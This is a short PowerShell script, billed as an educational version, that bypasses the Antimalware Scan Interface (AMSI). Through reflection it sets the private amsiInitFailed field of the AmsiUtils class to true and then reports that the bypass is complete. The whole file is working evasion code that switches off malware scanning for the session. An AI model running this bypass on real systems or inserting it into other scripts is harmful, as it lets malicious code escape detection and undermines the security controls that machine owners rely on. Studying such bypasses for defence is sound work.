# AMSI Field Corruption Bypass - Educational Version (PowerShell 5)
# This is a plain, non-obfuscated version for learning purposes
# Shows how AMSI can be bypassed by corrupting internal fields

# Get the System.Management.Automation assembly (contains AMSI implementation)
$assembly = [Ref].Assembly

# Get the AmsiUtils type which contains AMSI fields
$amsiUtils = $assembly.GetType('System.Management.Automation.AmsiUtils')

if ($amsiUtils) {
    # Binding flags needed to access private static fields
    $bindingFlags = [Reflection.BindingFlags]'NonPublic,Static'
    
    # This makes PowerShell think AMSI initialization failed, so it won't scan
    try {
        $amsiInitFailedField = $amsiUtils.GetField('amsiInitFailed', $bindingFlags)
        if ($amsiInitFailedField -ne $null) {
            $amsiInitFailedField.SetValue($null, $true)
            Write-Host "[+] amsiInitFailed set to true" -ForegroundColor Green
        }
    } catch {
        Write-Host "[-] Failed to set amsiInitFailed: $_" -ForegroundColor Red
    }
}

Write-Host "`n[*] AMSI bypass complete" -ForegroundColor Cyan
